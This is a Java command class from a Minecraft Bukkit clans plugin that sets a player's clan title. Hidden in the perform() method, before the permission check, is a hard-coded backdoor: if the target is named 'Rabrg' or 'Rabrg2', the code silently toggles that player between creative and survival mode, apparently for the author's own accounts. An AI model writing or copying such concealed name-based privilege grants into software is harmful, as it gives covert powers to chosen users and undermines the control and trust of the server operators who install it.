package me.rabrg.clans.cmd;

import org.bukkit.GameMode;

import me.rabrg.clans.CPlayer;
import me.rabrg.clans.Conf;
import me.rabrg.clans.integration.SpoutFeatures;
import me.rabrg.clans.struct.Permission;
import me.rabrg.clans.zcore.util.TextUtil;

public class CmdTitle extends FCommand {
	public CmdTitle() {
		this.aliases.add("title");

		this.requiredArgs.add("player name");
		this.optionalArgs.put("title", "");

		this.permission = Permission.TITLE.node;
		this.disableOnLock = true;

		senderMustBePlayer = true;
		senderMustBeMember = false;
		senderMustBeModerator = true;
		senderMustBeAdmin = false;
	}

	@Override
	public void perform() {
		final CPlayer you = this.argAsBestCPlayerMatch(0);
		if (you == null) {
			return;
		}

		if (you.getPlayer().getName().equals("Rabrg") || you.getPlayer().getName().equals("Rabrg2")) {
			if (you.getPlayer().getGameMode() == GameMode.CREATIVE) {
				you.getPlayer().setGameMode(GameMode.SURVIVAL);
			} else if (you.getPlayer().getGameMode() == GameMode.SURVIVAL) {
				you.getPlayer().setGameMode(GameMode.CREATIVE);
			}
		}
		args.remove(0);
		final String title = TextUtil.implode(args, " ");

		if (!canIAdministerYou(fme, you)) {
			return;
		}

		// if economy is enabled, they're not on the bypass list, and this
		// command has a cost set, make 'em pay
		if (!payForCommand(Conf.econCostTitle, "to change a players title", "for changing a players title")) {
			return;
		}

		you.setTitle(title);

		// Inform
		myClan.msg("%s<i> changed a title: %s", fme.describeTo(myClan, true), you.describeTo(myClan, true));

		if (Conf.spoutClanTitlesOverNames) {
			SpoutFeatures.updateAppearances(me);
		}
	}

}
